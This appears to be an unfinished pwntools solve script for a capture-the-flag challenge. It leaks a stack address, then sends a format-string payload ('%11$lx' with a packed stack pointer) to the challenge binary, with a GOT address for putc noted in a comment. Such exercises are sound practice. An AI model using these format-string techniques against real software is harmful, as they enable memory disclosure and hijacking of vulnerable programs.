#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)
    got_putc = 0x404070 #0x4010e6
    # main 0x4013f4 
    r.recvuntil(b"gift: ")
    stack = eval(r.recvline(0).split()[0])
    print(hex(stack))
    r.sendlineafter(b"option: ", b"2")
    payload = f"%11$lx".encode().ljust(24,b"_") + p64(stack-208)
    gdb.attach(r)
    pause()
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
